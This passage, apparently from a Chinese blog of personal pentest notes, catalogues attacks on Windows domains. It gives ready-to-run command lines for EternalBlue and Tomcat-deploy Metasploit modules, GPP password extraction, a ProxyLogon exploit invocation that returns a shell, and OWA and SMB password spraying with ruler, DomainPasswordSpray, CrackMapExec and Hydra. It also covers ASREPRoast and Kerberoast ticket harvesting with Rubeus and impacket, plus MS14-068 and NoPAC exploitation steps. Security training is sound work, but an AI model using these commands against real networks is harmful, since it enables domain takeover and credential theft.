WINS 服务器发出请求</li><li>如果没有配置 WINS 服务器或 WINS 服务器无响应则会向当前子网域发送广播</li><li>如果发送广播后无任何主机响应则会读取本地的 lmhosts 文件</li></ul><h4 id="投毒"><a class="markdownIt-Anchor" href="#投毒"></a> 投毒</h4><p>与DNS投毒类似。其他投毒还有：ARP投毒等。</p><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><p>LDAP（Lightweight Directory Access Protocol，轻量目录访问协议）是一种用于访问和维护分布式目录信息服务的协议，例如域控制器中的用户、组、计算机等信息。LDAP连接是指使用LDAP客户端软件或工具，通过LDAP协议，向LDAP服务器（如域控制器）发起连接请求，并提供认证信息，以便查询或修改目录中的数据</p><p>LDAP连接的地址一般是类似于<code>ldap://servername/DN</code>的格式，其中servername是LDAP服务器的名称或IP地址，DN是Distinguished Name，即目录中对象的唯一标识。</p><blockquote><p>例如，如果您想要使用LDAP Browser客户端工具连接到域控制器<code>dc1.example.com</code>，并查询域<code>example.com</code>中的对象，您可以输入<code>ldap://dc1.example.com/dc=example,dc=com</code>作为连接地址</p></blockquote><h3 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h3><p>Windows的权限分为四种：User、Administrator、System、TrustedInstaller。最后一个权限是最高的，只有他能够修改系统文件，这个是SYSTEM做不到的，它可以改很多文件，并且DUMP散列值等。</p><h1 id="初步渗透"><a class="markdownIt-Anchor" href="#初步渗透"></a> 初步渗透</h1><p>这一阶段，主要依靠搜集来的信息，对域内主机、域内用户发起攻击，主要有三个部分，分别为：</p><ol><li>各种主机的初步漏洞尝试</li><li>密码喷洒</li><li>中间人攻击/重放攻击</li></ol><h2 id="常见漏洞尝试"><a class="markdownIt-Anchor" href="#常见漏洞尝试"></a> 常见漏洞尝试</h2><p>这段时期，应该已经做好了补丁的探测，然后对以下相关漏洞进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit/multi/misc/java_rmi_server</span><br><span class="line">ms17-010：exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary/scanner/http/tomcat_enum</span><br><span class="line">jboss manager：exploit/multi/http/tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin/mssql/mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure><h3 id="zerologonon域控admin-主机admin"><a class="markdownIt-Anchor" href="#zerologonon域控admin-主机admin"></a> ZeroLogonon【域控admin、主机admin】</h3><blockquote><p>TAG：域控权限、不用凭证</p></blockquote><h4 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h4><p>ZeroLogon (CVE-2020-1472) 影响域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案 (AES-CFB8)，在通过NetLogon协议与AD域控建立安全通道时，强行登录尝试，对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限。</p><p>总的来说，就是绕过正常认证，获取域管权限，但是这个可能会让这个主机脱域，慎重！</p><h4 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Captain_RB/article/details/120643838">https://blog.csdn.net/Captain_RB/article/details/120643838</a></p><p>已完成复现</p><h3 id="永恒之蓝域控admin-主机admin"><a class="markdownIt-Anchor" href="#永恒之蓝域控admin-主机admin"></a> 永恒之蓝【域控admin、主机admin】</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/9eek/p/16703300.html">永恒之蓝（Eternal Blue）是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限的攻击方式</a>。可以使用msf中的<code>exploit/windows/smb/ms17_010_eternalblue</code>来进行攻击。</p><h3 id="sysvol-gpp-ms14-025"><a class="markdownIt-Anchor" href="#sysvol-gpp-ms14-025"></a> SYSVOL &amp; GPP MS14-025</h3><h4 id="相关知识"><a class="markdownIt-Anchor" href="#相关知识"></a> 相关知识</h4><p><strong>SYSVOL（System Volume）是Windows操作系统中的一个共享文件夹，用于存储登录脚本、组策略模板和其他域范围的公共文件</strong>。它是在Windows域控制器上自动创建的，用于在整个域中分发和复制系统策略、登录脚本和其他相关文件。SYSVOL 使用分布式文件系统（DFS）来确保这些文件在域控制器之间进行复制和同步。所有的域组策略存储在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</span><br></pre></td></tr></table></figure><p><strong>GPP（Group Policy Preferences）是一种Windows组策略扩展，允许管理员在域环境中配置用户和计算机设置</strong>。GPP 允许管理员设置各种设置，如映射网络驱动器、创建本地用户账户、配置注册表设置等。<strong>GPP 可以通过组策略在域中的计算机和用户之间分发这些设置</strong>。</p><blockquote><p>映射驱动（Drives.xml）<br>创建本地用户<br>数据源（DataSources.xml）<br>打印机配置（Printers.xml）<br>创建/更新服务（Services.xml）<br>计划任务（ScheduledTasks.xml）<br>更改本地Administrator密码</p></blockquote><p><strong>在早期的 Windows 版本中，GPP 存储了一些敏感数据（如密码）的 XML 文件，这些文件以安全不当的方式存储在 SYSVOL 共享中，导致了潜在的安全风险</strong>。</p><p><strong>攻击者可以通过解析这些 XML 文件，从中获取敏感数据，甚至可以获取本地管理员密码等。这种漏洞可以被恶意利用，使得攻击者能够在域环境中进行更大范围的攻击，例如横向移动和提权。</strong></p><h4 id="攻击路线"><a class="markdownIt-Anchor" href="#攻击路线"></a> 攻击路线</h4><ol><li>手工查找：<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code></li><li>使用msf：<code>post/windows/gather/credentials/gpp</code>，<code>auxiliary/scanner/smb/smb_enum_gpp</code></li><li>使用powersploit：<code>Get-GPPPassword.ps1</code></li></ol><h3 id="exchange相关"><a class="markdownIt-Anchor" href="#exchange相关"></a> Exchange相关</h3><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此我们需要多多关注exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p><p>Exchange的proxyshell和proxylogon漏洞是两组不同的漏洞，但都可以让攻击者远程执行任意代码并控制Exchange服务器。简单地说：</p><ul><li><strong>proxylogon</strong>是CVE-2021-26855的名称，它是一个存在于Microsoft Exchange Server的漏洞，可以使攻击者<strong>绕过身份验证并模拟用户</strong>。攻击者可以利用这个漏洞访问本地Exchange服务器，从而可以访问邮箱账号，并且安装其他恶意软件对受害机器进行长期的控制。</li><li><strong>proxyshell</strong>是CVE-2021-34473、CVE-2021-34523和CVE-2021-31207的组合利用，它们也是存在于Microsoft Exchange Server的漏洞，可以使攻击者<strong>绕过身份验证并执行任意命令</strong>。攻击者可以利用这些漏洞创建一个Webshell，从而可以远程控制Exchange服务器，并且执行任何操作。</li></ul><h4 id="信息搜集-2"><a class="markdownIt-Anchor" href="#信息搜集-2"></a> 信息搜集</h4><ol><li><p>邮箱用户密码爆破：</p><p>使用ruler工具对owa接口进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler —domain targetdomain.com brute —users /path/to/user.txt —passwords /path/to/passwords.txt</span><br></pre></td></tr></table></figure><ul><li>ruler工具会自动搜索owa可以爆破的<a target="_blank" rel="noopener" href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">接口</a></li><li><a target="_blank" rel="noopener" href="https://mail.targetdomain.com/ews">ews接口</a>也存在被暴力破解利用的风险</li></ul></li><li><p>通讯录搜集</p><p>在获取一个邮箱账号密码后，可以使用<strong>MailSniper</strong>收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure></li></ol><h4 id="proxylogon"><a class="markdownIt-Anchor" href="#proxylogon"></a> proxylogon</h4><p>流程：参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&amp;mid=2247493659&amp;idx=1&amp;sn=0b284ceae81206b21d21af7b46726cb1&amp;chksm=fd847c71caf3f567792145602787132ebbc7c72e9bb63369e0719a2e38043b78673f450f9e3d&amp;scene=21#wechat_redirect">链接</a></p><ol><li>通过SSRF漏洞攻击，访问Autodiscover.xml获取LegacyDN信息</li><li>在通过LegacyDN，获取SID</li><li>然后通过合法的SID，获取exchange的有效Cookie</li><li>最后通过有效的Cookie，对OABVirtualDirectory对象进行恶意操作，写入Webshell，达到控制目标的效果</li></ol><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/640.png" alt="图片"></p><p>工具：<a target="_blank" rel="noopener" href="https://github.com/Udyz/Proxylogon">https://github.com/Udyz/Proxylogon</a></p><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python proxylogon.py 192.168.100.110 ruyu@test.com</span><br><span class="line">192.168.100.110 Exchange的IP</span><br><span class="line">ruyu@test.com	普通域账户</span><br></pre></td></tr></table></figure><p>执行完成后，会返回一个shell，也可以自己写一个shell进去</p><h4 id="proxyshell"><a class="markdownIt-Anchor" href="#proxyshell"></a> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1876800">proxyshell</a></h4><p>ProxyShell是利用了Exchange对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。这是好几个漏洞的集合，调用链如下：</p><ol><li>CVE-2021-34473（一个ssrf漏洞）</li><li>CVE-2021-34523（Exchange PowerShell BackEnd提权）</li><li>CVE-2021-31207（认证后任意文件写入漏洞）</li></ol><p>工具：<a target="_blank" rel="noopener" href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><h4 id="privexchangecve-2019-07240686"><a class="markdownIt-Anchor" href="#privexchangecve-2019-07240686"></a> Privexchange(CVE-2019-0724/0686)</h4><p>这个漏洞的原理是利用Exchange的NTLM认证功能，通过SSRF漏洞发送特制的HTTP请求，将域控制器的NTLM哈希值发送给攻击者，然后利用这些哈希值进行传递性攻击。</p><p>利用步骤如下：</p><ol><li>攻击者通过Exchange Web服务发送一个包含自己IP地址的HTTP请求，触发SSRF漏洞。</li><li>Exchange服务器向攻击者的IP地址发送一个NTLM认证请求，包含Exchange服务器的NTLM哈希值。</li><li>攻击者回复一个特制的NTLM认证响应，包含域控制器的IP地址和一个Exchange权限的SID。</li><li>Exchange服务器向域控制器发送一个NTLM认证请求，包含域控制器的NTLM哈希值。</li><li>攻击者截获域控制器的NTLM哈希值，并利用它们进行传递性攻击，获得域管理员权限。</li></ol><p>工具：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange.git">https://github.com/dirkjanm/PrivExchange.git</a></p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><h3 id="windows提权"><a class="markdownIt-Anchor" href="#windows提权"></a> Windows提权</h3><h3 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h3><h2 id="用户密码破解"><a class="markdownIt-Anchor" href="#用户密码破解"></a> 用户密码破解</h2><h3 id="密码喷洒固定密码爆破账户"><a class="markdownIt-Anchor" href="#密码喷洒固定密码爆破账户"></a> 密码喷洒（固定密码，爆破账户）</h3><p>密码喷洒攻击属于一种自动化攻击的方式，为了避免只针对一个用户进行密码爆破而造成账户锁定，密码喷洒攻击是对所有用户进行爆破，既避免了用户被锁定，同时也提高了用户破解密码的效率。同时，不同于固定用户名对密码进行爆破，密码喷洒攻击是<strong>固定密码对用户名进行爆破</strong>。</p><p>原理是：我们登录到域时，Kerberos会有几种返回值，分别为：用户存在/用户不存在/客户端吊销。根据这几种返回值，判断是否有用户并且登录成功。</p><p>需要注意的是，因为登录失败5次就锁定账户了，所以注意别被锁了。</p><p>工具：</p><ol><li><p><a target="_blank" rel="noopener" href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>【环境：powershell 2.0】</p><p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-Powershell%E3%80%90good%E3%80%91">https://github.com/3gstudent/Homework-of-Powershell【good】</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取账户名</span><br><span class="line">Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</span><br><span class="line"># 单个密码喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Password Spring2017</span><br><span class="line"># 多个密码/用户喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt</span><br></pre></td></tr></table></figure></li><li><p><a target="_blank" rel="noopener" href="https://codeload.github.com/3gstudent/pyKerbrute">https://codeload.github.com/3gstudent/pyKerbrute</a></p></li><li><p><a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker%EF%BC%8C%E9%99%A4%E4%BA%86%E4%B8%8A%E8%BF%B0%E7%9A%84%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%EF%BC%8C%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%EF%BC%8C%E4%BE%8B%E5%A6%82mysql%E7%AD%89%E7%AD%89">https://github.com/shack2/SNETCracker，除了上述的密码喷洒，还有其他应用的密码喷洒，例如mysql等等</a></p></li><li><p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.12 -u users.txt -p &#x27;admin!@#45&#x27; --continue-on-success</span><br></pre></td></tr></table></figure></li><li><p>Hydra</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -p admin!@#45 10.10.10.12 smb</span><br></pre></td></tr></table></figure></li><li><p>MSF的<code>scanner/smb/smb_login</code>模块</p></li></ol><p>注意了，这些都是需要搭建代理/隧道的</p><p>检测手段：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37427514">https://zhuanlan.zhihu.com/p/37427514</a></p><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291782.html">https://www.freebuf.com/articles/web/291782.html</a></p><h3 id="asreproast"><a class="markdownIt-Anchor" href="#asreproast"></a> ASREPRoast</h3><p>ASREPRoast是一种对用户账号进行离线爆破的攻击方式，它利用了Kerberos协议中的一个特性：预身份认证。</p><blockquote><p>Kerberos预身份验证是Kerberos身份验证的第一步，它的主要作用是防止密码脱机爆破预身份验证。默认情况下，预身份验证是开启的，域控会记录密码错误次数，防止在线爆破。如果用户账号没有开启预身份验证，域控不会作任何验证就将TGT票据和该用户Hash加密的Session Key返回</p></blockquote><p>利用过程大致如下：</p><ol><li><p>攻击者查找目标域中<strong>没有开启Kerberos预身份验证</strong>的用户，可以使用工具（例如PowerView、CrackMapExec等）进行枚举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerView&gt; Get-DomainUser -PreauthNotRequired -Verbose</span><br><span class="line">crackmapexec&gt; crackmapexec smb 10.10.10.10 --kerberos -u Administrator -H 00000000000000000000000000000000</span><br></pre></td></tr></table></figure></li><li><p>攻击者向域控制器发送AS_REQ请求，代表这些用户，获取AS_REP响应。这些响应中包含了用用户密码加密的数据块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;username.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line">Rubeus.exe asreproast /format:hashcat</span><br></pre></td></tr></table></figure></li><li><p>攻击者将这些数据块保存为hash文件，使用工具（例如hashcat、john等）进行离线爆破，获取用户密码</p></li></ol><h3 id="kerberoast"><a class="markdownIt-Anchor" href="#kerberoast"></a> Kerberoast</h3><p>Kerberoasting的攻击方式，它的目的是获取服务账号的密码哈希，破解然后重写。</p><p>这些票据可以通过考虑多种因素来识别，例如：</p><blockquote><p>SPNs绑定到域用户账户</p><p>最后一次密码设置（Password last set）</p><p>密码过期时间</p><p>最后一次登录（Last logon）</p></blockquote><p>具体来说，Kerberoast攻击涉及以下五个步骤：</p><blockquote><p><a target="_blank" rel="noopener" href="http://www.freebuf.com/system/174229.html?preview=true">服务主体名称（SPN）发现</a></p><p>请求服务票据</p><p>导出服务票据</p><p>破解服务票据</p><p>重写服务票据&amp;RAM注入</p></blockquote><p>具体步骤如下：</p><ol><li><p>攻击者用LDAP查询域内的spn，spn是服务主体名称，用于标识提供服务的账号和主机</p><p><strong>使用ldap查询spn有多种方法</strong></p><ol><li><p>使用PowerShell的<code>Get-ADUser</code> cmdlet，可以指定<code>servicePrincipalName</code>作为过滤条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell&gt; Get-ADUser -Filter &#123;ServicePrincipalName -like &quot;*&quot;&#125; -Properties ServicePrincipalName</span><br></pre></td></tr></table></figure></li><li><p>使用ldapsearch工具，可以指定servicePrincipalName作为搜索属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -h dc1.contoso.com -b &quot;dc=contoso,dc=com&quot; &quot;(servicePrincipalName=*)&quot; servicePrincipalName</span><br></pre></td></tr></table></figure></li><li><p>使用impacket</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip 10.10.10.10 contoso.com/Administrator:Password</span><br></pre></td></tr></table></figure></li><li><p>使用psexec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -k -no-pass contoso.com/Administrator@10.10.10.10</span><br></pre></td></tr></table></figure></li><li><p>直接使用powershell自带指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */* // 查看当前域内所有的 SPN</span><br></pre></td></tr></table></figure></li></ol></li><li><p>攻击者向域控发送TGS包，TGS是票据授予服务，用于请求访问服务的票据。域控会返回一个TGS票据，其中包含了用服务账号密码哈希加密的数据</p><p>破解哈希值可以用：</p><ol><li><p>使用Rubeus：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /spn:MSSQLSvc/dc1.contoso.com /outfile:hash.txt</span><br></pre></td></tr></table></figure></li></ol></li><li><p>攻击者将这些数据保存为hash文件，使用工具（例如hashcat）进行离线爆破，获取服务账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGSrepcrack.py</span><br></pre></td></tr></table></figure></li><li><p>注入可以使用mimikatz</p></li></ol><p>这一套下来可以使用工具：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/291783.html">https://www.freebuf.com/articles/web/291783.html</a></p><h3 id="blind-kerberoasting"><a class="markdownIt-Anchor" href="#blind-kerberoasting"></a> Blind Kerberoasting</h3><h3 id="cve-2022-33679-kerberos提权漏洞"><a class="markdownIt-Anchor" href="#cve-2022-33679-kerberos提权漏洞"></a> CVE-2022-33679 Kerberos提权漏洞</h3><p><strong>利用条件：需要设置“不需要 Kerberos 预身份验证”用户帐户控制标志，并配置了 RC4 密钥，比较苛刻</strong></p><p>攻击流程：</p><ol><li>攻击者发送一个没有预授权的 AS-REQ 请求 RC4-MD4 密钥加密。如果用户不需要预授权，KDC 将发回一个 AS-REP，其中包含使用 RC4-MD4 加密的会话密钥等。</li><li>根据加密数据的长度，计算出加密密钥开始前的0x15字节，只要总长度就可以猜到。可能需要发送适当长的主机地址来填充 ASN1 编码数据，以便将密钥对齐到合适的位置。</li><li>根据计算出的ASN1数据和加密后的KDC-REP生成密钥流的前0x2D字节（密文中前0x18字节全为0）。</li><li>使用密钥流加密 PA-ENC-TIMESTAMP 预认证缓冲区，如果仅使用 KerberosTime，则大小将恰好为 0x15 字节，即带有初始填充的 0x2D。</li><li>在新的 AS-REQ 中发送加密的时间戳以验证密钥流是否正确。</li></ol><h2 id="相关知识点-2"><a class="markdownIt-Anchor" href="#相关知识点-2"></a> 相关知识点</h2><h3 id="sysvol"><a class="markdownIt-Anchor" href="#sysvol"></a> SYSVOL</h3><h1 id="凭证-令牌和哈希信息的利用"><a class="markdownIt-Anchor" href="#凭证-令牌和哈希信息的利用"></a> 凭证、令牌和哈希信息的利用</h1><h2 id="凭证令牌抓取本地管理员权限"><a class="markdownIt-Anchor" href="#凭证令牌抓取本地管理员权限"></a> 凭证/令牌抓取【本地管理员权限】</h2><h2 id="哈希破解"><a class="markdownIt-Anchor" href="#哈希破解"></a> 哈希破解</h2><h2 id="模拟凭证访问服务"><a class="markdownIt-Anchor" href="#模拟凭证访问服务"></a> 模拟凭证，访问服务</h2><h1 id="横向移动"><a class="markdownIt-Anchor" href="#横向移动"></a> 横向移动</h1><h2 id="查看是否出网"><a class="markdownIt-Anchor" href="#查看是否出网"></a> 查看是否出网</h2><p>可以用以下命令判断:</p><blockquote><p>ping : icmp</p><p>curl : http</p><p>nslookup : dns</p></blockquote><h2 id="laps"><a class="markdownIt-Anchor" href="#laps"></a> LAPS</h2><p>本地管理员密码解决方案 (LAPS) 是一种通过域管理本地管理员帐户密码的方法。如果没有圈数，支持团队很难管理为每个系统保留唯一的本地管理员密码。这会导致共享凭据，这意味着当攻击者在系统上获得提升的权限时，他们可以转储共享凭据并使用它来访问其他系统。</p><p>攻击的前提是：已获得域内成员的凭据</p><h1 id="获取域控"><a class="markdownIt-Anchor" href="#获取域控"></a> 获取域控</h1><h2 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068"></a> MS14-068</h2><p>此漏洞用于制作金票据和银票据。</p><p>MS14-068是一个<strong>Windows Kerberos 特权提升漏洞</strong>，它可以让攻击者伪造域控管理员的TGT和ST，获取域内任意用户的权限。利用这个漏洞的条件是<strong>域控没有打MS14-068的补丁(KB3011780)</strong>，并且攻击者<strong>拿下一台加入域的计算机</strong>，同时知道<strong>任意域用户名、SID、密码</strong>。利用这个漏洞的方法是使用工具如ms14-068.exe或者PyKEY生成伪造的TGT和ST，然后使用mimikatz.exe将证书写入内存。</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><ol><li><p>信息搜集：</p><ol><li><p>获取域用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; net user /domain</span><br><span class="line">bunny</span><br></pre></td></tr></table></figure></li><li><p>获取sid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami /user</span><br><span class="line">whoamianony\bunny S-1-5-21-1315137663-3706837544-1429009142-1112</span><br></pre></td></tr></table></figure></li><li><p>获取域控名和域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; net time /domain</span><br><span class="line">\\DC.whoamianony.org 的当前时间是 2023/7/17 14:13:04</span><br></pre></td></tr></table></figure></li><li><p>获取域控IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ping DC.whoamianony.org</span><br><span class="line">正在 Ping dc.whoamianony.org [192.168.93.30] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure></li></ol></li><li><p>清空凭证</p></li><li><p>制作金票据</p></li></ol><h3 id="金银票据的区别"><a class="markdownIt-Anchor" href="#金银票据的区别"></a> 金银票据的区别</h3><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230629111115012.png" alt="image-20230629111115012"></p><ol><li><p>访问权限不同：</p><ul><li>Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li>Silver Ticket：伪造TGS（也就是ST），只能访问指定的服务</li></ul></li><li><p>加密方式不同：</p><ul><li><p>Golden Ticket由Kerberos的Hash加密</p></li><li><p>Silver Ticket由服务账号（通常为计算机账户）</p></li></ul></li><li><p>Hash加密认证流程不同：</p><ul><li>Golden Ticket的利用过程需要访问域控</li><li>Silver Ticket不需要访问域控</li></ul></li><li><p>伪造跳跃的步骤不同</p><p>黄金票据是伪造TGT，在kerberos认证中忽略前两步，白银票据就是直接伪造ST</p></li></ol><h2 id="privexchangecve-2019-07240686-2"><a class="markdownIt-Anchor" href="#privexchangecve-2019-07240686-2"></a> Privexchange(CVE-2019-0724/0686)</h2><p>这个漏洞的原理是利用Exchange的NTLM认证功能，通过SSRF漏洞发送特制的HTTP请求，将域控制器的NTLM哈希值发送给攻击者，然后利用这些哈希值进行传递性攻击。</p><p>利用步骤如下：</p><ol><li>攻击者通过Exchange Web服务发送一个包含自己IP地址的HTTP请求，触发SSRF漏洞。</li><li>Exchange服务器向攻击者的IP地址发送一个NTLM认证请求，包含Exchange服务器的NTLM哈希值。</li><li>攻击者回复一个特制的NTLM认证响应，包含域控制器的IP地址和一个Exchange权限的SID。</li><li>Exchange服务器向域控制器发送一个NTLM认证请求，包含域控制器的NTLM哈希值。</li><li>攻击者截获域控制器的NTLM哈希值，并利用它们进行传递性攻击，获得域管理员权限。</li></ol><p>工具：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PrivExchange.git">https://github.com/dirkjanm/PrivExchange.git</a></p><h2 id="nopacsamaccountnamecve-2021-4228742278"><a class="markdownIt-Anchor" href="#nopacsamaccountnamecve-2021-4228742278"></a> NoPAC/SamAccountName(CVE-2021-42287/42278)</h2><p>NoPac/SamAccountName漏洞是指两个Active Directory相关的漏洞的组合利用，分别是<strong>CVE-2021-42278</strong>和<strong>CVE-2021-42287</strong>。这两个漏洞都与sAMAccountName属性有关，该属性是域用户的唯一标识符。</p><ul><li><p>CVE-2021-42278漏洞，它允许一个攻击者使用一个ST，向域控发起S4U2Proxy请求TGS，并利用该TGS伪造任意用户的身份；允许攻击者通过修改自己的sAMAccountName为域控的计算机名，欺骗域控认为自己是域控。</p></li><li><p>CVE-2021-42287漏洞，它允许一个攻击者使用创建的计算机账户获取到的TGT，向域控发起S4U2Self请求ST，并利用该ST进行横向移动和权限提升；允许攻击者通过在sAMAccountName后面加上<code>$</code>符号，绕过域控的安全检查，获取域控的权限。</p></li><li><p>利用这两个漏洞的关键点是，域控在处理S4U2Self和S4U2Proxy请求时，会根据ST中的SamAccountName字段来判断用户的身份，而不是根据PAC（Privilege Attribute Certificate）字段，而这个字段是可以被攻击者修改的</p></li></ul><h3 id="利用流程"><a class="markdownIt-Anchor" href="#利用流程"></a> 利用流程</h3><ol><li>创建一个计算机账户，并获取其TGT。</li><li>使用该TGT向域控发起S4U2Self请求ST，并修改ST中的SamAccountName字段为目标用户（如域管）。42287</li><li>使用该ST向域控发起S4U2Proxy请求TGS，并修改TGS中的SamAccountName字段为目标用户。42278</li><li>使用该TGS访问目标用户可以访问的服务（如域控），并执行任意命令</li></ol><h3 id="适用工具"><a class="markdownIt-Anchor" href="#适用工具"></a> 适用工具</h3><ul><li><p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">nopac CVE-2021-42287/CVE-2021-42278 Scanner &amp; Exploiter</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./noPac.exe -domain dc.com -user username -pass &#x27;password&#x27; /dc 